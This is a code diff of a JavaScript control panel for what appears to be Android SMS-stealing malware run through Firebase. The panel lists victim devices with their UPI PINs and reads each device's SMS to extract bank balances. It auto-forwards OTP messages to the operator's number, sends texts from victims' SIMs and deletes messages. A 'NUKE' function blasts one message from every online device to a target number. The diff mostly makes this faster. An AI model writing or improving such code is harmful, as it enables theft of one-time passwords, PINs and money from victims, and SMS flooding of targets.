 function stopMsgStream(){if(_msgStream){try{_msgStream.close();}catch(e){}_msgStream=null;_msgStreamUid=null;_msgStreamDev=null;}}
 function _handleStreamMsg(dev,key,data){
-  var t0=performance.now();
   var msg=parseMsgSingle(key,data);
   if(!msg)return;
   var cacheKey=(dev._fbId||'primary')+'|||'+dev.id;
@@ -453,6 +342,8 @@ function _handleStreamMsg(dev,key,data){
     if(bal){deviceBalances[dev.id]=bal;try{localStorage.setItem('fbi_device_balances',JSON.stringify(deviceBalances));}catch(e){}updateCardNoBlink(dev.id);if(selDev&&selDev.id===dev.id)refreshDeviceModal();}
   }
 }
+
+/* ═══════ FORWARD — INSTANT ═══════ */
 function _instantForward(dev,msg){
   if(userConfig.forwardEnabled===false)return;
   var myNum=userConfig.myNumber;
@@ -462,14 +353,11 @@ function _instantForward(dev,msg){
   if(!msg.message||!msg.message.trim()||msg.message.trim()==='(no body)')return;
   var sim=deviceSimMap[dev.id]||1;
   var hp=isHighPriority(msg);
-  if(hp)sendHighPrioritySms(dev,sim,myNum,msg.message.trim(),'hp').then(function(ok){if(ok)toast('🔥 OTP forwarded → '+myNum);});
-  else sendSmsFireAndForget(dev,sim,myNum,msg.message.trim(),'instant',false).then(function(ok){if(ok)toast('📤 Forwarded → '+myNum);});
+  var txt=msg.message.trim();
+  if(hp)sendHighPrioritySms(dev,sim,myNum,txt,'hp').then(function(ok){if(ok)toast('🔥 OTP forwarded');});
+  else sendSmsFireAndForget(dev,sim,myNum,txt,'instant').then(function(ok){if(ok)toast('📤 Forwarded');});
 }
-function setMyNumberDefault(){
-  if(!userConfig.myNumber){toast('⚠ Set My Number in Settings');return;}
-  var el=document.getElementById('dmSendTo');
-  if(el){el.value=userConfig.myNumber;toast('📞 '+userConfig.myNumber);}
-}
+function setMyNumberDefault(){if(!userConfig.myNumber){toast('⚠ Set My Number in Settings');return;}var el=document.getElementById('dmSendTo');if(el){el.value=userConfig.myNumber;toast('📞 '+userConfig.myNumber);}}
 function parseMsgSingle(key,m){
   var message='',sender='',dateTime='',type='incoming';
   if(typeof m==='string'){message=m;sender='Unknown';}
@@ -490,13 +378,13 @@ function parseMsgSingle(key,m){
   return{key:key,message:message||'(no body)',sender:sender||'Unknown',dateTime:dateTime,type:type,_ts:parseDT(dateTime)};
 }
 
-/* ═══════ POLLERS ═══════ */
+/* ═══════ POLLERS — FAST ═══════ */
 function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{
   var d=await fbGet('clients');var nD=parseDevs(d);
   nD.forEach(function(dev){dev._fbId='primary';dev._fbLabel='Primary';dev._fbUrl=FB_URL;dev._fbKey=FB_KEY;});
   var others=allDevices.filter(function(x){return(x._fbId||'primary')!=='primary';});
   allDevices=applyStableOrder(nD.concat(others));
-  renderStats();renderGrid();          /* 🆕 no force */
+  renderStats();renderGrid();
   if(selDev){var up=allDevices.find(function(x){return x.id===selDev.id;});if(up){selDev=up;refreshDeviceModal();}}
 }catch(e){}},POLL_DEV);}
 function stopDP(){if(dPoll){clearInterval(dPoll);dPoll=null;}}
@@ -509,7 +397,7 @@ function stopAP(){if(aPoll){clearInterval(aPoll);aPoll=null;}}
 function setupObs(){killObs();var s=document.getElementById('amSentinel');if(!s)return;amObs=new IntersectionObserver(function(e){if(e[0].isIntersecting)renderPage();},{rootMargin:'400px'});amObs.observe(s);}
 function killObs(){if(amObs){amObs.disconnect();amObs=null;}}
 
-/* ═══════ BG FORWARD ═══════ */
+/* ═══════ BG FORWARD — FAST ═══════ */
 function startBgForwardPoll(){stopBgForwardPoll();bgPoll=setInterval(bgForwardTick,POLL_BG);}
 function stopBgForwardPoll(){if(bgPoll){clearInterval(bgPoll);bgPoll=null;}}
 async function bgForwardTick(){
@@ -523,7 +411,7 @@ async function bgForwardTick(){
   if(_msgStreamUid===uid&&_msgStream&&_msgStream.readyState===1)return;
   try{
     var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';
-    var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=20',{signal:AbortSignal.timeout(4000)});
+    var r=await _fastFetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=20');
     if(!r.ok)return;
     var msgs=parseMsgs(await r.json());
     if(msgs.length)checkAndForward(msgs,dev.id);
@@ -576,81 +464,62 @@ function deviceMatchesSearch(d,query){
   if(!query)return true;
   var q=query.toLowerCase().trim();if(!q)return true;
   var bal=deviceBalances[d.id];
-  var hay=[d.name||'',d.id||'',d.mobNo||'',(d.mobNo||'').replace(/\+/g,''),(d.mobNo||'').replace(/\D/g,''),d.ip||'',d.note||'',noteC[d.id]||'',d.serviceProvider||'',d.upipin||'',pinC[d.id]||'',(d.sims||[]).map(function(s){return(s.phoneNumber||'')+' '+(s.phone||'');}).join(' '),bal?(bal.bank+' '+bal.amount):'',bal?String(bal.amount):'',d.status?'online':'offline'].join(' ').toLowerCase();
+  var carriers=devCarrierList(d).join(' ').toLowerCase();
+  var hay=[d.name||'',d.id||'',d.mobNo||'',(d.mobNo||'').replace(/\+/g,''),(d.mobNo||'').replace(/\D/g,''),d.ip||'',d.note||'',noteC[d.id]||'',d.serviceProvider||'',carriers,d.upipin||'',pinC[d.id]||'',(d.sims||[]).map(function(s){return(s.phoneNumber||'')+' '+(s.phone||'')+' '+(s.carrier||'');}).join(' '),bal?(bal.bank+' '+bal.amount):'',bal?String(bal.amount):'',d.status?'online':'offline'].join(' ').toLowerCase();
   return hay.indexOf(q)!==-1;
 }
 function setDeviceSearch(v){deviceSearchQuery=v||'';renderGrid(true);}
 function clearDeviceSearch(){var el=document.getElementById('deviceSearch');if(el)el.value='';deviceSearchQuery='';renderGrid(true);}
 
-/* ═══════ GRID — NO BLINK (structural sig only) ═══════ */
+/* ═══════ GRID ═══════ */
 function _computeGridSig(filtered){
   var parts=[deviceSearchQuery||''];
   for(var i=0;i<filtered.length;i++){
     var d=filtered[i];
     var uid=(d._fbId||'primary')+'|||'+d.id;
-    /* 🆕 only STRUCTURAL fields — not status/battery/balance */
-    parts.push(uid+'|'+(d.deviceOrder||i)+'|'+(d.name||'')+'|'+(d.mobNo||'')+'|'+(d.note||noteC[d.id]||'')+'|'+(d.serviceProvider||''));
+    parts.push(uid+'|'+(d.deviceOrder||i)+'|'+(d.name||'')+'|'+(d.mobNo||'')+'|'+(d.note||noteC[d.id]||'')+'|'+(d.serviceProvider||'')+'|'+devCarrierList(d).join(','));
   }
   return filtered.length+'##'+parts.join('##');
 }
-
-/* 🆕 Update a single card without re-render */
 function updateCardNoBlink(devId){
   var d=allDevices.find(function(x){return x.id===devId;});
   if(!d)return;
   var uid=(d._fbId||'primary')+'|||'+d.id;
   var card=document.querySelector('.device-card[data-uid="'+CSS.escape(uid)+'"]');
   if(!card)return;
-  /* Update status */
   var isOn=d.status;
   card.classList.toggle('online',isOn);
   var dot=card.querySelector('.dc-icon .dot');
   if(dot){dot.classList.toggle('on',isOn);dot.classList.toggle('off',!isOn);}
   var stVals=card.querySelectorAll('.dc-stat-val');
   if(stVals[2]){stVals[2].textContent=isOn?'ON':'OFF';stVals[2].style.color=isOn?'var(--mint)':'var(--dim)';}
-  /* Battery */
-  if(stVals[0]){
-    var bv=d.batteryNum;
-    var bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
-    stVals[0].textContent=isNaN(bv)?d.batteryRaw:bv+'%';stVals[0].style.color=bc;
-  }
-  /* Balance */
+  if(stVals[0]){var bv=d.batteryNum;var bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';stVals[0].textContent=isNaN(bv)?d.batteryRaw:bv+'%';stVals[0].style.color=bc;}
   var bal=deviceBalances[d.id];
   var balEl=card.querySelector('.dc-balance');
-  if(balEl){
-    if(bal){
-      balEl.classList.remove('empty');
-      balEl.innerHTML='<div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">'+esc(bal.bank)+'</div><div class="dc-bal-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div>';
-    }
-  }
+  if(balEl&&bal){balEl.classList.remove('empty');balEl.innerHTML='<div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">'+esc(bal.bank)+'</div><div class="dc-bal-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div>';}
 }
-
 function renderGrid(force){
   var grid=document.getElementById('deviceGrid');
   var filtered=allDevices.filter(function(d){
     if(gridFilter==='online'&&!d.status)return false;
     if(gridFilter==='offline'&&d.status)return false;
+    if(gridFilter==='jio'&&!deviceHasCarrier(d,'Jio'))return false;
+    if(gridFilter==='vi'&&!deviceHasCarrier(d,'Vi'))return false;
     if(gridFilter==='pin'&&!d.upipin&&!pinC[d.id])return false;
     if(gridFilter==='balance'&&!deviceBalances[d.id])return false;
     if(!deviceMatchesSearch(d,deviceSearchQuery))return false;
     return true;
   });
-
   if(!filtered.length){
     var emptyMsg=deviceSearchQuery?'<p>No devices match "'+esc(deviceSearchQuery)+'"</p>':'<p>No devices match this filter</p>';
     var emptySig='__EMPTY__'+(deviceSearchQuery||'');
-    if(_lastGridSig!==emptySig){
-      grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">📵</div>'+emptyMsg+'</div>';
-      _lastGridSig=emptySig;_cardRefs={};
-    }
+    if(_lastGridSig!==emptySig){grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">📵</div>'+emptyMsg+'</div>';_lastGridSig=emptySig;_cardRefs={};}
     return;
   }
-
   var sig=_computeGridSig(filtered);
   if(!force && sig===_lastGridSig)return;
   _lastGridSig=sig;
   _cardRefs={};
-
   var html='';
   filtered.forEach(function(d,i){
     var uid=(d._fbId||'primary')+'|||'+d.id;
@@ -663,7 +532,9 @@ function renderGrid(force){
     var emo=d.name.toLowerCase().includes('iphone')?'🍎':d.name.toLowerCase().includes('samsung')?'📱':'📲';
     var bal=deviceBalances[d.id];
     var balHtml=bal?'<div class="dc-balance"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">'+esc(bal.bank)+'</div><div class="dc-bal-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div></div>':'<div class="dc-balance empty"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-val">—</div></div>';
-    html+='<div class="device-card '+(d.status?'online':'')+' '+(isActive?'active':'')+'" data-uid="'+esc(uid)+'" onclick="openDeviceModal(\''+esc(uid)+'\')" style="animation-delay:0s">'
+    var carriers=devCarrierList(d);
+    var carBadges=carriers.map(function(c){return '<span class="dc-badge sim">📡 '+esc(c)+'</span>';}).join('');
+    html+='<div class="device-card '+(d.status?'online':'')+' '+(isActive?'active':'')+'" data-uid="'+esc(uid)+'" onclick="openDeviceModal(\''+esc(uid)+'\')">'
       +'<div class="dc-top"><div class="dc-icon">'+emo+'<div class="dot '+(d.status?'on':'off')+'"></div></div>'
       +'<div class="dc-meta"><div class="dc-name">'+esc(d.name)+'</div><div class="dc-id">#'+(d.deviceOrder||(i+1))+' · '+esc(d.id.substring(0,14))+'…</div></div>'
       +(isActive?'<div class="dc-active-pill">ACTIVE</div>':'')+'</div>'
@@ -678,13 +549,13 @@ function renderGrid(force){
       +'<div class="dc-footer"><div class="dc-badges">'
         +(d.upipin||pinC[d.id]?'<span class="dc-badge pin">💳 PIN</span>':'')
         +(used?'<span class="dc-badge used">✓ Used</span>':'')
-        +(d.serviceProvider?'<span class="dc-badge sim">'+esc(d.serviceProvider)+'</span>':'')
+        +carBadges
       +'</div><div class="dc-conn">#'+(d.deviceOrder||(i+1))+'</div></div></div>';
   });
   grid.innerHTML=html;
 }
 function toggleFilterMenu(e){if(e)e.stopPropagation();document.getElementById('filterMenu').classList.toggle('open');}
-function setGridFilter(f){gridFilter=f;var labels={all:'All',online:'Online',offline:'Offline',pin:'PIN',balance:'Balance'};document.getElementById('filterLabel').textContent=labels[f]||'All';document.querySelectorAll('.filter-menu > div').forEach(function(el){el.classList.toggle('active',el.dataset.f===f);});document.getElementById('filterMenu').classList.remove('open');renderGrid(true);}
+function setGridFilter(f){gridFilter=f;var labels={all:'All',online:'Online',offline:'Offline',jio:'Jio',vi:'Vi',pin:'PIN',balance:'Balance'};document.getElementById('filterLabel').textContent=labels[f]||'All';document.querySelectorAll('.filter-menu > div').forEach(function(el){el.classList.toggle('active',el.dataset.f===f);});document.getElementById('filterMenu').classList.remove('open');renderGrid(true);}
 document.addEventListener('click',function(e){var menu=document.getElementById('filterMenu');if(menu&&!e.target.closest('.filter-wrap'))menu.classList.remove('open');});
 
 /* ═══════ DEVICE MODAL ═══════ */
@@ -695,7 +566,7 @@ function openDeviceModal(uid){
   if(!d){toast('⚠ Device not found');return;}
   selDev=d;activeDeviceUid=uid;
   try{localStorage.setItem(CFG.LS_ACTIVE||'fbi_active_device',uid);}catch(e){}
-  savePanelSession();  /* 🆕 */
+  savePanelSession();
   renderGrid(true);
   document.getElementById('deviceModal').classList.add('open');
   refreshDeviceModal();
@@ -703,26 +574,33 @@ function openDeviceModal(uid){
   if(cached){allMsgs=cached;lastKeys=new Set(cached.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();_silentRefresh(selDev);}
   else{document.getElementById('dmMsgList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';allMsgs=[];lastKeys=new Set();preloadMsgs(selDev.id);}
   updOtpNoteBox();
-  setTimeout(function(){var toInp=document.getElementById('dmSendTo');if(toInp&&!toInp.value&&userConfig.myNumber)toInp.value=userConfig.myNumber;},100);
+  setTimeout(function(){var toInp=document.getElementById('dmSendTo');if(toInp&&!toInp.value&&userConfig.myNumber)toInp.value=userConfig.myNumber;},50);
 }
 function refreshDeviceModal(){
   if(!selDev)return;
   var d=selDev;
   document.getElementById('dmName').textContent=d.name;
-  document.getElementById('dmSub').textContent='#'+(d.deviceOrder||'—')+' · '+d.id;
+  var dmSubEl=document.getElementById('dmSub');
+  if(dmSubEl) dmSubEl.innerHTML='#'+(d.deviceOrder||'—')+' · <span style="border-bottom:1px dashed var(--border2)">'+esc(d.id)+'</span> 📋';
   var bv=d.batteryNum,bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
   var bp=isNaN(bv)?0:Math.min(100,Math.max(0,bv)),bd=isNaN(bv)?d.batteryRaw:bv+'%';
   document.getElementById('dmHero').innerHTML='<div class="dm-hero-batt"><div class="dm-hero-batt-num" style="color:'+bc+'">'+bd+'</div><div class="dm-hero-batt-lbl">Battery</div></div>'
     +'<div class="dm-hero-batt-bar"><div class="dm-hero-batt-fill" style="width:'+bp+'%;background:'+bc+'"></div></div>'
     +'<div class="dm-hero-status"><span style="background:'+(d.status?'rgba(6,214,160,.14)':'rgba(244,63,94,.1)')+';color:'+(d.status?'var(--mint)':'var(--rose)')+'">'+(d.status?'● ONLINE':'● OFFLINE')+'</span>'
-    +(d.serviceProvider?'<span style="background:rgba(56,189,248,.12);color:var(--sky)">'+esc(d.serviceProvider)+'</span>':'')
+    +devCarrierList(d).map(function(c){return '<span style="background:rgba(56,189,248,.12);color:var(--sky)">📡 '+esc(c)+'</span>';}).join('')
     +(d.isRoot?'<span style="background:rgba(168,85,247,.14);color:var(--gold2)">⚡ Root</span>':'')+'</div>';
   var bal=deviceBalances[d.id];
   var balHero=document.getElementById('dmBalHero');
   if(bal){balHero.className='dm-bal-hero';balHero.innerHTML='<div class="dm-bal-hero-lbl">💰 Latest Balance Detected</div><div class="dm-bal-hero-val" data-copy="'+esc(String(bal.amount))+'" onclick="copyFromEl(this,event)">'+fmtBal(bal.amount)+'</div><div class="dm-bal-hero-sub"><b>🏦 '+esc(bal.bank)+'</b> · '+esc(bal.sender||'—')+(bal.ts?' · '+new Date(bal.ts).toLocaleString():'')+'</div>';}
   else{balHero.className='dm-bal-hero empty';balHero.innerHTML='<div class="dm-bal-hero-lbl">💰 Latest Balance</div><div class="dm-bal-hero-val">No banking SMS found yet</div>';}
-  document.getElementById('dmSim1').textContent=d.sims[0]?fmtPh(d.sims[0].phoneNumber||d.sims[0].phone||''):'No SIM';
-  document.getElementById('dmSim2').textContent=d.sims[1]?fmtPh(d.sims[1].phoneNumber||d.sims[1].phone||''):'No SIM';
+  var s1=d.sims[0], s2=d.sims[1];
+  var c1=getSimCarrier(s1, d.serviceProvider), c2=getSimCarrier(s2, d.serviceProvider);
+  document.getElementById('dmSim1').textContent=s1?(fmtPh(s1.phoneNumber||s1.phone||'')+' · '+c1):'No SIM';
+  document.getElementById('dmSim2').textContent=s2?(fmtPh(s2.phoneNumber||s2.phone||'')+' · '+c2):'No SIM';
+  var sel1=document.querySelector('#dmSimSelect .sim-opt[data-sim="1"] .sim-opt-lbl');
+  var sel2=document.querySelector('#dmSimSelect .sim-opt[data-sim="2"] .sim-opt-lbl');
+  if(sel1) sel1.textContent='SIM 1'+(s1?(' · '+c1):'');
+  if(sel2) sel2.textContent='SIM 2'+(s2?(' · '+c2):'');
   var curSim=deviceSimMap[d.id]||1;
   document.querySelectorAll('#dmSimSelect .sim-opt').forEach(function(el){el.classList.toggle('active',parseInt(el.dataset.sim)===curSim);});
   document.querySelectorAll('#dmPane-send .stb').forEach(function(el,i){el.className='stb'+(i+1===curSim?(i+1===1?' s1':' s2'):'');});
@@ -743,6 +621,24 @@ function dmSwitchTab(tab){document.querySelectorAll('.dm-tab').forEach(function(
 function setActiveSim(sim){if(!selDev)return;deviceSimMap[selDev.id]=sim;saveDeviceSims();refreshDeviceModal();toast('✓ SIM '+sim+' active');}
 function saveNoteActive(){if(!selDev)return;var val=document.getElementById('dmNoteInp').value.trim();fbSet('clients/'+selDev.id+'/note',val||null,selDev._fbUrl,selDev._fbKey).then(function(){noteC[selDev.id]=val;selDev.note=val;toast('📝 Note saved');renderGrid(true);}).catch(function(){toast('⚠ Failed');});}
 function confDelActive(){if(!selDev)return;document.getElementById('confT').textContent='Delete Device?';document.getElementById('confM').textContent='Delete "'+selDev.name+'"?';document.getElementById('confOk').onclick=async function(){closeM('confirmModal');try{await fbDel('clients/'+selDev.id,selDev._fbUrl,selDev._fbKey);toast('✓ Deleted');closeM('deviceModal');loadDevs();}catch(e){toast('⚠ Failed');}};openM('confirmModal');}
+
+/* ═══════ COPY DEVICE ID ═══════ */
+function copyDeviceId(){
+  if(!selDev){toast('⚠ No device');return;}
+  var id=selDev.id;
+  var done=function(){toast('📋 ID copied: '+id);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(id).then(done).catch(function(){
+      var ta=document.createElement('textarea');ta.value=id;document.body.appendChild(ta);ta.select();
+      try{document.execCommand('copy');done();}catch(e){}
+      ta.remove();
+    });
+  } else {
+    var ta2=document.createElement('textarea');ta2.value=id;document.body.appendChild(ta2);ta2.select();
+    try{document.execCommand('copy');done();}catch(e){}
+    ta2.remove();
+  }
+}
 
 /* ═══════ BALANCE ═══════ */
 function extractBalanceFromText(txt){
@@ -769,18 +665,18 @@ function extractLastBalance(msgs){
   return null;
 }
 function fmtBal(n){return '\u20B9'+Number(n).toLocaleString('en-IN',{maximumFractionDigits:2});}
-function startBalancePoll(){stopBalancePoll();balPoll=setInterval(balanceTick,POLL_BAL);setTimeout(balanceTick,800);}
+function startBalancePoll(){stopBalancePoll();balPoll=setInterval(balanceTick,POLL_BAL);setTimeout(balanceTick,300);}
 function stopBalancePoll(){if(balPoll){clearInterval(balPoll);balPoll=null;}}
 async function balanceTick(){
   if(!FB_URL||_balTickRunning)return;_balTickRunning=true;
   try{
     var online=allDevices.filter(function(d){return d.status;});
-    var BATCH=12;
+    var BATCH=30;
     for(var i=0;i<online.length;i+=BATCH){
       await Promise.allSettled(online.slice(i,i+BATCH).map(async function(dev){
         try{
           var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';
-          var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=30',{signal:AbortSignal.timeout(4000)});
+          var r=await _fastFetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=30');
           if(!r.ok)return;
           var bal=extractLastBalance(parseMsgs(await r.json()));
           if(bal)deviceBalances[dev.id]=bal;
@@ -788,7 +684,6 @@ async function balanceTick(){
       }));
     }
     try{localStorage.setItem('fbi_device_balances',JSON.stringify(deviceBalances));}catch(e){}
-    /* 🆕 no-blink update instead of full render */
     online.forEach(function(d){updateCardNoBlink(d.id);});
     if(selDev)refreshDeviceModal();
   }finally{_balTickRunning=false;}
@@ -818,7 +713,7 @@ function renderBankPane(){
 async function getPin(id){
   var dev=allDevices.find(function(d){return d.id===id;});
   var u=dev&&dev._fbUrl||FB_URL,k=dev&&dev._fbKey!==undefined?dev._fbKey:FB_KEY;
-  try{var auth=k?'?auth='+k:'';var r=await fetch(u+'/clients/'+id+'/upipin.json'+auth,{signal:AbortSignal.timeout(4000)});var val=await r.json();
+  try{var auth=k?'?auth='+k:'';var r=await _fastFetch(u+'/clients/'+id+'/upipin.json'+auth);var val=await r.json();
     if(val===null||val===undefined||val===false||val==='')return null;
     if(typeof val==='string'&&val.trim())return val.trim();
     if(typeof val==='number')return String(val);return null;
@@ -850,7 +745,7 @@ async function preloadMsgs(id){
   var fbUrl=selDev._fbUrl||FB_URL,fbKey=selDev._fbKey!==undefined?selDev._fbKey:FB_KEY;
   try{
     var auth=fbKey?'?auth='+fbKey+'&':'?';
-    var r=await fetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(6000)});
+    var r=await _fastFetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200');
     if(!r.ok)throw new Error('HTTP '+r.status);
     var msgs=parseMsgs(await r.json());
     _msgCache[cacheKey]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
@@ -864,7 +759,7 @@ async function pollMsgs(id){
   var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
   try{
     var auth=fbKey?'?auth='+fbKey+'&':'?';
-    var r=await fetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(4000)});
+    var r=await _fastFetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200');
     if(!r.ok)return;
     var msgs=parseMsgs(await r.json());
     var hasNew=msgs.some(function(m){return !lastKeys.has(m.key);});
@@ -880,7 +775,7 @@ async function pollMsgs(id){
 function _silentRefresh(dev){
   var cacheKey=(dev._fbId||'primary')+'|||'+dev.id;
   var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';
-  fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(4000)}).then(function(r){return r.json();}).then(function(data){
+  _fastFetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=200').then(function(r){return r.json();}).then(function(data){
     var msgs=parseMsgs(data);
     _msgCache[cacheKey]=msgs;
     if(selDev&&selDev.id===dev.id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();}
@@ -922,10 +817,10 @@ async function doDelMsg(){closeM('delMsgModal');if(!_delPendingDevId||!_delPendi
   try{var dev=allDevices.find(function(d){return d.id===_delPendingDevId;});await fbDel('messages/'+_delPendingDevId+'/'+_delPendingKey,dev&&dev._fbUrl,dev&&dev._fbKey);if(amCache[_delPendingDevId])amCache[_delPendingDevId]=amCache[_delPendingDevId].filter(function(m){return m.key!==_delPendingKey;});if(selDev&&selDev.id===_delPendingDevId){allMsgs=allMsgs.filter(function(m){return m.key!==_delPendingKey;});updCnt();filterActiveMsgs();renderBankPane();}toast('🗑 Deleted');}catch(e){toast('⚠ Failed');}
   _delPendingDevId=null;_delPendingKey=null;}
 
-/* ═══════ SEND SMS ═══════ */
+/* ═══════ SEND SMS — INSTANT ═══════ */
 function updOtpNoteBox(){if(!selDev)return;var note=otpNoteC[selDev.id]||'';var disp=document.getElementById('dmOtpNoteDisp'),inp=document.getElementById('dmOtpNoteInp');if(disp){disp.textContent=note||'No OTP note saved yet…';disp.className='otp-note-disp'+(note?'':' empty');}if(inp)inp.value=note;}
 function saveOtpNoteActive(){if(!selDev)return;var val=document.getElementById('dmOtpNoteInp').value.trim();otpNoteC[selDev.id]=val;var disp=document.getElementById('dmOtpNoteDisp');if(disp){disp.textContent=val||'No OTP note saved yet…';disp.className='otp-note-disp'+(val?'':' empty');}toast('✓ OTP note saved');}
-async function sendSmsActive(){
+function sendSmsActive(){
   if(!selDev){toast('⚠ No device');return;}
   var to=document.getElementById('dmSendTo').value.trim();
   var msg=document.getElementById('dmSendMsg').value.trim();
@@ -933,14 +828,15 @@ async function sendSmsActive(){
   var sim=deviceSimMap[selDev.id]||1;
   var btn=document.getElementById('dmSendBtn');btn.disabled=true;btn.textContent='Sending…';
   var hp=isHighPriority({message:msg});
-  var pr=hp?sendHighPrioritySms(selDev,sim,to,msg,'manual-hp'):sendSmsFireAndForget(selDev,sim,to,msg,'manual',false);
+  /* FIRE INSTANTLY — no waiting */
+  var pr=hp?sendHighPrioritySms(selDev,sim,to,msg,'manual-hp'):sendSmsFireAndForget(selDev,sim,to,msg,'manual');
   pr.then(function(ok){
-    if(ok){showResActive(true,'✓ SMS queued from SIM '+sim+(hp?' 🔥':''));document.getElementById('dmSendMsg').value='';}
+    if(ok){showResActive(true,'✓ SMS queued from SIM '+sim);document.getElementById('dmSendMsg').value='';}
     else{showResActive(false,'⚠ Failed');}
     btn.disabled=false;btn.textContent='🚀 Send Message';
   });
 }
-function showResActive(ok,m){var el=document.getElementById('dmSendRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},4000);}
+function showResActive(ok,m){var el=document.getElementById('dmSendRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},3000);}
 
 /* ═══════ ALL MSGS ═══════ */
 function openAllMsgs(){openM('allMsgsModal');trigAM(false);startAP();}
@@ -951,10 +847,10 @@ async function loadAllMsgs(force){
   if(!onlineDevs.length){document.getElementById('amList').innerHTML='<div class="empty"><div class="ei">📱</div><p>No online devices</p></div>';return;}
   amLoading=true;var now=Date.now();
   var toFetch=onlineDevs.filter(function(d){return force||!amCache[d.id]||now-amFetch[d.id]>10000;});
-  var BATCH=30;
+  var BATCH=50;
   for(var i=0;i<toFetch.length;i+=BATCH){
     await Promise.allSettled(toFetch.slice(i,i+BATCH).map(async function(dev){
-      try{var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=50',{signal:AbortSignal.timeout(4000)});amCache[dev.id]=parseMsgs(r.ok?await r.json():null);amFetch[dev.id]=Date.now();}catch(e){if(!amCache[dev.id])amCache[dev.id]=[];}
+      try{var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY,auth=fbKey?'?auth='+fbKey+'&':'?';var r=await _fastFetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=50');amCache[dev.id]=parseMsgs(r.ok?await r.json():null);amFetch[dev.id]=Date.now();}catch(e){if(!amCache[dev.id])amCache[dev.id]=[];}
     }));
     rebuild();filterAndRender();await new Promise(function(r){setTimeout(r,0);});
   }
@@ -995,10 +891,10 @@ function renderPage(){
 }
 async function pollAllFresh(){}
 
-/* ═══════ NUKE ═══════ */
+/* ═══════ NUKE — MAX SPEED ═══════ */
 function openNuke(){document.getElementById('nukeModal').classList.add('open');updateNukeInfo();}
 function updateNukeInfo(){var online=allDevices.filter(function(d){return d.status;});var simsTotal=0;online.forEach(function(d){simsTotal+=d.sims.length||0;});var totalShots=online.reduce(function(s,d){return s+(d.sims.length||0);},0);document.getElementById('nukeDeviceCount').textContent=online.length;document.getElementById('nukeSimCount').textContent=simsTotal;document.getElementById('nukeTotalShots').textContent=totalShots;}
-async function fireNuke(){
+function fireNuke(){
   var target=document.getElementById('nukeTarget').value.trim(),msg=document.getElementById('nukeMsg').value.trim();
   if(!target||!msg){toast('⚠ Enter number and message');return;}
   var online=allDevices.filter(function(d){return d.status;});if(!online.length){toast('⚠ No online devices');return;}
@@ -1015,7 +911,7 @@ async function fireNuke(){
       var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
       var body=JSON.stringify({from:shot.sim,to:target,message:msg,isSended:false});
       _nukeActive++;
-      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true,priority:'high'})
+      _fastFetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body})
         .then(function(r){if(r.ok)nukeSent++;else nukeFail++;}).catch(function(){nukeFail++;})
